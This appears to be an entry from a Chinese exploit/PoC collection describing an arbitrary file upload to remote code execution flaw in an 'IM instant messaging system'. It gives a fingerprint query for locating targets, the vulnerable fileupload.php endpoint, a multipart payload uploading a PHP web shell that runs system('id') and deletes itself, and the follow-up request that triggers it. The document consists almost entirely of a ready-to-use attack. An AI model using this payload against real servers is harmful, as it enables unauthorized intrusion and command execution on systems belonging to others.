# IM即时通讯系统fileupload.php存在任意文件上传致RCE漏洞

- **系统**：IM即时通讯系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/superloginAction.html"`
- **请求**：`POST /static/lib/webuploader/0.1.5/server/fileupload.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lC…`

**请求体 / payload**
```
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: text/plain
<?php system("id");unlink(__FILE__);?>
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
GET /static/lib/webuploader/0.1.5/server/upload/rce.php HTTP/1.1
Host:
```
- **预期**：200　|　—